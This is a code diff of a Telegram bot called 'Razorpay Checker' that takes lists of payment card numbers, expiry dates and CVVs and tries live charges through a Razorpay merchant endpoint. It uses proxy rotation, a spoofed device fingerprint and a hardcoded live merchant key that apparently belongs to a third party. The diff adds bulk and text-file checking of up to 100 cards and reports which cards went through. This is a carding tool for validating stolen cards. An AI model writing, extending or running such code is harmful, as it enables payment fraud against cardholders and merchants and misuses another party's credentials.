@@ -6,6 +6,7 @@
 ║              RAZORPAY CHECKER TELEGRAM BOT — KALI EDITION                 ║
 ║              Channel: @dlxdropp | Coder: @deluxe_cc                       ║
 ║              Telegram Bot Version — Railway Ready                         ║
+║              ✅ Single Check | ✅ Bulk Check | ✅ TXT File Support        ║
 ╚══════════════════════════════════════════════════════════════════════════════╝
 """
 
@@ -53,6 +54,7 @@ AMOUNT_MAX = 100
 
 DEVICE_FINGERPRINT = "noXc7Zv4NmOzRNIl3zmSernrLMFEo05J0lh73kdY46cUpMIuLjBQbCwQygBbMH4t4xfrCkwWutyony5DncDTRX0e50ULyy2GMgy2LUxAwaxczwLNJYzwLXqTe7GlMxqzCo7XgsfxKEWuy6hRjefIXYKVOJ23KBn6..."
 
+# 🔥 FALLBACK MERCHANT — SCRIPT MEIN PEHLE SE HAI!
 FALLBACK_MERCHANT = {
     'keyless_header': 'api_v1:vNQKl/R1ASkk7vT9MvJY3tYVjeV3jfltskhOwoZUfQad2n91vwexGYzlLxMw0vBL5GLS0xDghw9xZogu31Tg3VQ1UesS9Q==',
     'key_id': 'rzp_live_hrgl3RDoNMvCOs',
@@ -60,7 +62,7 @@ FALLBACK_MERCHANT = {
     'payment_page_item_id': 'ppi_OzLkvSvf1drPpt'
 }
 
-# ─── PROXY MANAGER (FROM ORIGINAL) ────────────────────────
+# ─── PROXY MANAGER ─────────────────────────────────────────
 class ProxyManager:
     def __init__(self):
         self.proxies = []
@@ -92,11 +94,11 @@ class ProxyManager:
             return {"server": f"http://{ip}:{port}"}
         return None
 
-# ─── RAZORPAY CHECKER (SAME AS ORIGINAL) ──────────────────
+# ─── RAZORPAY CHECKER ──────────────────────────────────────
 class RazorpayChecker:
     def __init__(self, proxy_manager=None, site_url=None):
         self.proxy_manager = proxy_manager
-        self.site_url = site_url
+        self.site_url = site_url  # Optional — agar user set kare toh
         self.results = []
         self.success_count = 0
         self.fail_count = 0
@@ -115,6 +117,7 @@ class RazorpayChecker:
             return f"{card_number[:6]}******{card_number[-4:]}"
         return card_number
     
+    # 🔥 SITE EXTRACTION — PEHLE FALLBACK USE KAREGA, AGAR USER SITE SET KARE TOH WO
     def extract_merchant_from_site(self):
         if not self.site_url:
             return FALLBACK_MERCHANT, "fallback"
@@ -312,6 +315,7 @@ class RazorpayChecker:
             'error': None, 'time': 0
         }
         
+        # 🔥 MERCHANT DATA EXTRACT — PEHLE FALLBACK USE KAREGA
         merchant_data, _ = self.extract_merchant_from_site()
         keyless_header = merchant_data.get('keyless_header')
         key_id = merchant_data.get('key_id')
@@ -409,7 +413,8 @@ class RazorpayChecker:
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
         [InlineKeyboardButton("💳 Single Check", callback_data="single")],
-        [InlineKeyboardButton("📋 Batch Check", callback_data="batch")],
+        [InlineKeyboardButton("📋 Bulk Check", callback_data="bulk")],
+        [InlineKeyboardButton("📄 TXT File Check", callback_data="txt")],
         [InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
         [InlineKeyboardButton("📊 Results", callback_data="results")],
         [InlineKeyboardButton("❓ Help", callback_data="help")]
@@ -436,19 +441,34 @@ async def handle_single(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     context.user_data['mode'] = 'single'
 
-async def handle_batch(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def handle_bulk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     await query.edit_message_text(
-        "📋 *Batch Card Check*\n\n"
+        "📋 *Bulk Card Check*\n\n"
         "Send cards one per line:\n"
         "`CC|MM|YYYY|CVV`\n\n"
         "Example:\n"
         "`4147202600656415|04|2028|079`\n"
-        "`4147202600656416|05|2028|079`",
+        "`4147202600656416|05|2028|079`\n"
+        "`4147202600656417|06|2028|079`\n\n"
+        "Max 100 cards per batch.",
         parse_mode="Markdown"
     )
-    context.user_data['mode'] = 'batch'
+    context.user_data['mode'] = 'bulk'
+
+async def handle_txt(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    await query.edit_message_text(
+        "📄 *TXT File Check*\n\n"
+        "Send a `.txt` file containing cards.\n"
+        "One card per line:\n"
+        "`CC|MM|YYYY|CVV`\n\n"
+        "Reply to this message with the file.",
+        parse_mode="Markdown"
+    )
+    context.user_data['mode'] = 'txt'
 
 async def handle_settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -457,7 +477,6 @@ async def handle_settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("💰 Amount", callback_data="set_amount")],
         [InlineKeyboardButton("🌐 Currency", callback_data="set_currency")],
         [InlineKeyboardButton("🔄 Proxy", callback_data="set_proxy")],
-        [InlineKeyboardButton("🏠 Site URL", callback_data="set_site")],
         [InlineKeyboardButton("🔙 Back", callback_data="back")]
     ]
     await query.edit_message_text("⚙️ *Settings*", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
@@ -500,17 +519,6 @@ async def handle_set_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     context.user_data['setting'] = 'proxy'
 
-async def handle_set_site(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    await query.edit_message_text(
-        "🏠 *Set Site URL*\n\n"
-        "Enter site URL for merchant extraction:\n\n"
-        "Example: `https://pages.razorpay.com/IAEME#view-1`",
-        parse_mode="Markdown"
-    )
-    context.user_data['setting'] = 'site'
-
 async def handle_results(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -529,10 +537,14 @@ async def handle_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
     await query.edit_message_text(
         "❓ *Help Guide*\n\n"
-        "1. Set amount & currency\n"
-        "2. Add proxies (optional)\n"
-        "3. Enter site URL (optional)\n"
-        "4. Check single or batch cards\n\n"
+        "📌 *Commands:*\n"
+        "• Single Check — Check one card\n"
+        "• Bulk Check — Check multiple cards\n"
+        "• TXT File — Upload .txt file with cards\n\n"
+        "⚙️ *Settings:*\n"
+        "• Amount — Set charge amount\n"
+        "• Currency — USD/INR/USDT\n"
+        "• Proxy — Add proxies\n\n"
         "📌 *Format:* `CC|MM|YYYY|CVV`\n"
         "📢 Channel: @dlxdropp",
         parse_mode="Markdown"
@@ -550,9 +562,110 @@ async def handle_back(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
     await start(update, context)
 
+async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle TXT file upload."""
+    document = update.message.document
+    if not document.file_name.endswith('.txt'):
+        await update.message.reply_text("❌ Please send a `.txt` file.")
+        return
+    
+    # Download file
+    file = await context.bot.get_file(document.file_id)
+    file_path = f"cards_{update.effective_user.id}.txt"
+    await file.download_to_drive(file_path)
+    
+    # Read cards
+    try:
+        with open(file_path, 'r') as f:
+            cards = [line.strip() for line in f if line.strip() and not line.startswith('#')]
+    except Exception as e:
+        await update.message.reply_text(f"❌ Error reading file: {e}")
+        return
+    finally:
+        os.remove(file_path)
+    
+    if not cards:
+        await update.message.reply_text("❌ No valid cards found in file.")
+        return
+    
+    if len(cards) > 100:
+        await update.message.reply_text(f"⚠️ File has {len(cards)} cards. Max 100 allowed. Truncating to 100.")
+        cards = cards[:100]
+    
+    # Process bulk
+    await process_bulk(update, context, cards)
+
+async def process_bulk(update: Update, context: ContextTypes.DEFAULT_TYPE, cards):
+    """Process bulk card check."""
+    amount = context.user_data.get('amount', 'random')
+    currency = context.user_data.get('currency', 'USD')
+    proxy = context.user_data.get('proxy')
+    
+    proxy_manager = ProxyManager()
+    if proxy:
+        proxy_manager.load_from_string(proxy)
+    
+    # 🔥 SITE URL HATAYA — FALLBACK USE KAREGA
+    checker = RazorpayChecker(proxy_manager, None)
+    
+    status_msg = await update.message.reply_text(f"⏳ Processing {len(cards)} cards...")
+    
+    progress = {'current': 0, 'total': len(cards)}
+    def progress_callback(current, total, message):
+        progress['current'] = current
+        if current % 5 == 0 or current == total:
+            asyncio.create_task(status_msg.edit_text(f"⏳ Processing... {current}/{total} ({int(current/total*100)}%)"))
+    
+    checker.set_progress_callback(progress_callback)
+    result = checker.charge_batch(cards, amount, currency, max_workers=5)
+    context.user_data['last_results'] = result
+    
+    msg = f"📊 *BATCH COMPLETE*\n\n📌 Total: {result['total']}\n✅ Success: {result['success']}\n❌ Failed: {result['failed']}\n📈 Rate: {(result['success']/result['total']*100) if result['total'] > 0 else 0:.1f}%\n\n*Successful Cards:*\n"
+    for r in result['results'][:5]:
+        if r.get('success'):
+            msg += f"  ✅ `{r['masked']}` | ${r.get('amount_usd', 0)}\n"
+    if len([r for r in result['results'] if r.get('success')]) > 5:
+        msg += f"  ... and {len([r for r in result['results'] if r.get('success')]) - 5} more"
+    
+    await status_msg.edit_text(msg, parse_mode="Markdown")
+    
+    # Save results to file
+    if result['results']:
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"results_{timestamp}.txt"
+        with open(filename, 'w') as f:
+            f.write("=== RAZORPAY CHECKER RESULTS ===\n\n")
+            f.write(f"Total: {result['total']}\n")
+            f.write(f"Success: {result['success']}\n")
+            f.write(f"Failed: {result['failed']}\n")
+            f.write(f"Rate: {(result['success']/result['total']*100) if result['total'] > 0 else 0:.1f}%\n\n")
+            f.write("=== SUCCESSFUL CARDS ===\n")
+            for r in result['results']:
+                if r.get('success'):
+                    f.write(f"{r['masked']} | ${r.get('amount_usd', 0)} | {r.get('payment_id', 'N/A')}\n")
+            f.write("\n=== FAILED CARDS ===\n")
+            for r in result['results']:
+                if not r.get('success'):
+                    f.write(f"{r['masked']} | Error: {r.get('error', 'Unknown')}\n")
+        
+        with open(filename, 'rb') as f:
+            await context.bot.send_document(
+                chat_id=update.effective_chat.id,
+                document=f,
+                filename=filename,
+                caption="📁 Full results file."
+            )
+        os.remove(filename)
+
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle text messages."""
     user_text = update.message.text.strip()
     if not user_text:
+        return
+    
+    # Check if document
+    if update.message.document:
+        await handle_document(update, context)
         return
     
     setting = context.user_data.get('setting')
@@ -568,12 +681,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"✅ Proxies added: `{user_text[:50]}...`", parse_mode="Markdown")
         return
     
-    if setting == 'site':
-        context.user_data['site'] = user_text
-        context.user_data['setting'] = None
-        await update.message.reply_text(f"✅ Site URL set: `{user_text}`", parse_mode="Markdown")
-        return
-    
     mode = context.user_data.get('mode')
     if mode == 'single':
         if '|' not in user_text:
@@ -583,13 +690,12 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         amount = context.user_data.get('amount', 'random')
         currency = context.user_data.get('currency', 'USD')
         proxy = context.user_data.get('proxy')
-        site = context.user_data.get('site')
         
         proxy_manager = ProxyManager()
         if proxy:
             proxy_manager.load_from_string(proxy)
         
-        checker = RazorpayChecker(proxy_manager, site)
+        checker = RazorpayChecker(proxy_manager, None)
         
         status_msg = await update.message.reply_text("⏳ Processing card...")
         result = checker.charge_card(user_text, amount, currency)
@@ -603,43 +709,17 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data['mode'] = None
         context.user_data['last_results'] = {'total': 1, 'success': 1 if result.get('success') else 0, 'failed': 0 if result.get('success') else 1, 'results': [result]}
     
-    elif mode == 'batch':
+    elif mode == 'bulk':
         cards = [line.strip() for line in user_text.split('\n') if line.strip()]
         if not cards:
             await update.message.reply_text("❌ No valid cards found!", parse_mode="Markdown")
             return
         
-        amount = context.user_data.get('amount', 'random')
-        currency = context.user_data.get('currency', 'USD')
-        proxy = context.user_data.get('proxy')
-        site = context.user_data.get('site')
+        if len(cards) > 100:
+            await update.message.reply_text(f"⚠️ {len(cards)} cards. Max 100. Truncating.")
+            cards = cards[:100]
         
-        proxy_manager = ProxyManager()
-        if proxy:
-            proxy_manager.load_from_string(proxy)
-        
-        checker = RazorpayChecker(proxy_manager, site)
-        
-        status_msg = await update.message.reply_text(f"⏳ Processing {len(cards)} cards...")
-        
-        progress = {'current': 0, 'total': len(cards)}
-        def progress_callback(current, total, message):
-            progress['current'] = current
-            if current % 5 == 0 or current == total:
-                asyncio.create_task(status_msg.edit_text(f"⏳ Processing... {current}/{total} ({int(current/total*100)}%)"))
-        
-        checker.set_progress_callback(progress_callback)
-        result = checker.charge_batch(cards, amount, currency, max_workers=5)
-        context.user_data['last_results'] = result
-        
-        msg = f"📊 *BATCH COMPLETE*\n\n📌 Total: {result['total']}\n✅ Success: {result['success']}\n❌ Failed: {result['failed']}\n📈 Rate: {(result['success']/result['total']*100) if result['total'] > 0 else 0:.1f}%\n\n*Successful Cards:*\n"
-        for r in result['results'][:5]:
-            if r.get('success'):
-                msg += f"  ✅ `{r['masked']}` | ${r.get('amount_usd', 0)}\n"
-        if len([r for r in result['results'] if r.get('success')]) > 5:
-            msg += f"  ... and {len([r for r in result['results'] if r.get('success')]) - 5} more"
-        
-        await status_msg.edit_text(msg, parse_mode="Markdown")
+        await process_bulk(update, context, cards)
         context.user_data['mode'] = None
 
 # ─── MAIN ────────────────────────────────────────────────────
@@ -649,18 +729,19 @@ def main():
     
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CallbackQueryHandler(handle_single, pattern="single"))
-    app.add_handler(CallbackQueryHandler(handle_batch, pattern="batch"))
+    app.add_handler(CallbackQueryHandler(handle_bulk, pattern="bulk"))
+    app.add_handler(CallbackQueryHandler(handle_txt, pattern="txt"))
     app.add_handler(CallbackQueryHandler(handle_settings, pattern="settings"))
     app.add_handler(CallbackQueryHandler(handle_results, pattern="results"))
     app.add_handler(CallbackQueryHandler(handle_help, pattern="help"))
     app.add_handler(CallbackQueryHandler(handle_set_amount, pattern="set_amount"))
     app.add_handler(CallbackQueryHandler(handle_set_currency, pattern="set_currency"))
     app.add_handler(CallbackQueryHandler(handle_set_proxy, pattern="set_proxy"))
-    app.add_handler(CallbackQueryHandler(handle_set_site, pattern="set_site"))
     app.add_handler(CallbackQueryHandler(handle_back, pattern="back"))
     app.add_handler(CallbackQueryHandler(handle_curr_selection, pattern="curr_usd"))
     app.add_handler(CallbackQueryHandler(handle_curr_selection, pattern="curr_inr"))
     app.add_handler(CallbackQueryHandler(handle_curr_selection, pattern="curr_usdt"))
+    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     
     logger.info("🔥 Checker Bot is running!")
